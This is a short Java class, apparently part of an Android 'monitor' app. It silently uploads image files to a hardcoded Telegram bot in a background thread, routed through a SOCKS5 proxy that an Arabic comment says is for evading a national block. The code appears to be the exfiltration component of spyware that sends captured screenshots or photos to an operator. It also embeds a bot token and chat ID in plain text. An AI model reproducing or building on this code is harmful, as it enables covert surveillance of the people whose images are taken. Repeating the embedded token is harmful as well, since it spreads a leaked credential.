package com.tom5.monitor;

import okhttp3.*;
import java.io.File;
import java.net.*;
import java.util.concurrent.TimeUnit;

public class TelegramSender {
    private static final String BOT_TOKEN = "8254504974:AAEK4l6tyoFPOOaPN73A10Txf5Yq9Z5PlzY";
    private static final String CHAT_ID = "7259620384";

    public static void sendFile(File file) {
        new Thread(() -> {
            try {
                // إعداد البروكسي SOCKS5 لتجاوز حظر العراق
                Proxy proxy = new Proxy(Proxy.Type.SOCKS5, new InetSocketAddress("64.225.8.135", 1080)); 

                OkHttpClient client = new OkHttpClient.Builder()
                        .proxy(proxy)
                        .connectTimeout(30, TimeUnit.SECONDS)
                        .build();

                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", CHAT_ID)
                        .addFormDataPart("photo", file.getName(), RequestBody.create(MediaType.parse("image/png"), file))
                        .build();

                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                        .post(requestBody)
                        .build();

                client.newCall(request).execute();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }
}
